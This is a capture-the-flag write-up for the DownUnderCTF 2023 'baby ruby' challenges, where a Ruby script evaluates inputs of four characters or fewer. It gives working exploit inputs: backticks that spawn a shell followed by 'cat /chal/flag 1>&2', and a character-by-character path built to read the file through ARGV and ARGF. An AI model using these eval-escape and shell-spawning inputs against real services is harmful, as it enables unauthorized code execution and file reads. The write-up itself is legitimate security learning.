---
date: 2023-06-28
categories:
  - writeups
authors:
  - silk
tags:
  - misc
comments: true
---

# DownUnderCTF 2023: baby ruby / real baby ruby writeups

**Prompt (baby ruby):**
> How well do you know your Ruby?
> 
> The flag is at `/chal/flag`.
> 
> Author: hashkitten
> 
> `nc 2023.ductf.dev 30028`

**Prompt (real baby ruby):**
> How well do you really know your Ruby?
> 
> The flag is at `/chal/flag`.
> 
> Author: hashkitten
> 
> `nc 2023.ductf.dev 30031`
> 
> Hint: ARGF is a stream designed for use in scripts that process files given as command-line arguments or passed in via STDIN.

**Difficulty:** Medium

**Attachments:** [*baby.rb*](./attachments/baby.rb), [*real-baby.rb*](./attachments/real-baby.rb)

<!-- more -->

## baby ruby: First Look

Opening up `baby.rb`, we can see one line of Ruby code:

```rb
while input = STDIN.gets.chomp do eval input if input.size < 5 end
```

There is a while loop that is taking the input from STDIN, and so long as the input size is less than five bytes, the input is evaluated.

So we need to find some way to read `/chal/flag` with code snippets of four characters or less.

## baby ruby: Solution

The solution for the first baby ruby challenge is pretty simple. Ruby allows you to easily execute system commands through the use of backticks. So we can spawn a shell with:
```
`sh`
```

From here, STDIN has been redirected to the shell. However, when we run commands, we can't see anything. We can see error outputs.

The solution to this problem is to simply redirect STDOUT to STDERR for any shell commands we run.

So, if we run `cat /chal/flag 1>&2`, we get the flag: `DUCTF{how_to_pwn_ruby_in_four_easy_steps}`.

```
$ nc 2023.ductf.dev 30028
`sh`
cat /chal/flag 1>&2
DUCTF{how_to_pwn_ruby_in_four_easy_steps}
```

## real baby ruby: First Look

Next up is real baby ruby. Looking at the code, we can see that now the input is only evaluated if the input size is less than 5 and the input doesn't contain \` or `%`.

```rb
while input = STDIN.gets.chomp do eval input if input.size < 5 && input !~ /`|%/ end
```

We are also provided a hint, related to ARGF.

## real baby ruby: ARGV and ARGF

Doing some research brings us to [this Ruby docs page](https://ruby-doc.org/core-2.5.0/ARGF.html). This page explains that `ARGV` can be used to store file names, which then can be read through `ARGF`.

Here's an example from the docs page:
```rb
ARGV.replace ["file1"]
ARGF.readlines # Returns the contents of file1 as an Array
ARGV           #=> []
ARGV.replace ["file2", "file3"]
ARGF.read      # Returns the contents of file2 and file3
```

So if we can find some way to pass a file name into `ARGV`, we can read it with `ARGF`.

Unfortunately, these variable names alone are four characters and are too long. Luckily, Ruby has some aliases for these variable names. As seen on [this Ruby docs page](https://ruby-doc.org/docs/ruby-doc-bundle/Manual/man-1.4/variable.html):
```
ARGF
    The alias to the $<.
ARGV
    The alias to the $*.
```

So now instead of `ARGF` and `ARGV`, we can use `$<` and `$*`. However, `$*.replace` and `$<.read` are still too long, and we need a way to output the read file contents.

To append an element to the end of an array, Ruby has a handy `<<` operator. So we can do `$*<<'filename'`. Still too long, but if we store both `$*` and `'filename'` in variables, we can shorten it.

We need to make sure the variable name is all caps, or else it will be a local variable and die at the end of the `eval`. Ruby will yell at us for overwriting 'constants', but won't actually stop us.

```rb
A='filename' # still a problem
V=$*
V<<A
```

If we can find a way to build a string and store it in a variable, we now have a way to store it in ARGV.

Another trick Ruby has is the splat (`*`) operator, which is also capable of performing basically the same function as `read`/`readlines` when used with ARGF. We can read the file contents of the filename in ARGV with:

```rb
C=*$<
```

Still too long, but if we store `$<` in a variable, we can get it down to four characters.

```rb
F=$<
C=*F
```

Then `C` would contain the flag.

If we got the flag into `C`, we could output it with the `p` method which is similar to `print`.

```rb
p C
```

## real baby ruby: Building Strings

Now we need some way to store the path of the flag `/chal/flag` in a variable.

One idea is to create some string variable, and concat one character at a time. Again, we need all caps for variables to preserve them, and Ruby will complain, but it still works.

```rb
A=''
B='/' # five characters :(
A+=B
```

Unfortunately, `B='/'` is too long. For some reason however, Ruby has the ability to create a one-character string in just two characters `?/`.

```rb
A=''
B=?/ # four characters :)
A+=B
```

We can use this premise to build the whole string.

```rb
A=?/
B=?c
A+=B
B=?h
A+=B
B=?a
A+=B
B=?l
A+=B
B=?/
A+=B
B=?f
A+=B
B=?l
A+=B
B=?a
A+=B
B=?g
A+=B
p A
```

Output: `/chal/flag`

## real baby ruby: All Together Now

Putting the pieces together:

1. We can build a string.
2. With that string, we can append it to ARGV.
3. With ARGV, we can read the file using ARGF and print the contents.

```rb
# Comments are ignored because they are more than four characters long.

# Build string with /chal/flag
A=""
B=?/
A+=B
B=?c
A+=B
B=?h
A+=B
B=?a
A+=B
B=?l
A+=B
B=?/
A+=B
B=?f
A+=B
B=?l
A+=B
B=?a
A+=B
B=?g
A+=B
p A

# Add /chal/flag to ARGV
V=$*
V<<A
p V

# Read files in ARGV using ARGF
F=$<
p *F
```

Piping this to netcat gives us:

```
(eval):1: warning: already initialized constant A
(eval):1: warning: previous definition of A was here
(eval):1: warning: already initialized constant B
(eval):1: warning: previous definition of B was here
(eval):1: warning: already initialized constant A
(eval):1: warning: previous definition of A was here
(eval):1: warning: already initialized constant B
(eval):1: warning: previous definition of B was here
(eval):1: warning: already initialized constant A
(eval):1: warning: previous definition of A was here
(eval):1: warning: already initialized constant B
(eval):1: warning: previous definition of B was here
(eval):1: warning: already initialized constant A
(eval):1: warning: previous definition of A was here
"/chal/flag"
["/chal/flag"]
"DUCTF{sorry_for_the_unintended,hope_this_was_better_:-)}\n"
```

And we got the flag.

Thanks for the fun challenge hashkitten, I now know more about Ruby than I know what to do with.